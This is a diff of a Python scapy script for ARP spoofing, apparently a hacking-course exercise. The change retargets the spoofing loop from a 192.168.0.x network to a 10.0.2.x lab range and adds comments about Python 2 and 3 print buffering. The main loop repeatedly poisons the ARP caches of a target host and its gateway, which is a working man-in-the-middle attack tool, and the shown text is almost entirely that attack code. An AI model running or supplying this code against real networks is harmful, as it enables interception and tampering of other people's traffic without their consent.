@@ -1,6 +1,6 @@
 import scapy.all as scapy
 import time
-
+import sys
 def get_mac(ip):
     # This will allow us to create an ARP reqest ( who is x.x.x.x)
     arp_request= scapy.ARP(pdst=ip)
@@ -30,10 +30,24 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose= False)
 
 if __name__ == "__main__":
-    sent_packet_count= 0
+    sent_packet_count=0
     while True:
-        spoof("192.168.0.92", "192.168.0.1")
-        spoof("192.168.0.1", "192.168.0.92")
-        sent_packet_count+= 2
-        print("Packet Sent: ", str(sent_packet_count))
+        spoof("10.0.2.15", "10.0.2.1")
+        spoof("10.0.2.1", "10.0.2.15")
+        sent_packet_count += 2
+        # The comma at the end tells python to print
+        # everything on one line but only when the
+        # program ends or has been stopped. This is
+        # because python is storing it in a buffer.
+        # This also telling python to print without
+        # the \n character. 2.7 only
+        # print("\rPacket Sent: "+ str(sent_packet_count)),
+
+        # Python 3 version of commented statement above and below
+        print("\rPacket Sent: " + str(sent_packet_count),end="")
+
+        # This statement tells python to flush the buffer
+        # and only print out the last statement on the
+        # screen or as output for python 2.7
+        # sys.stdout.flush()
         time.sleep(2)
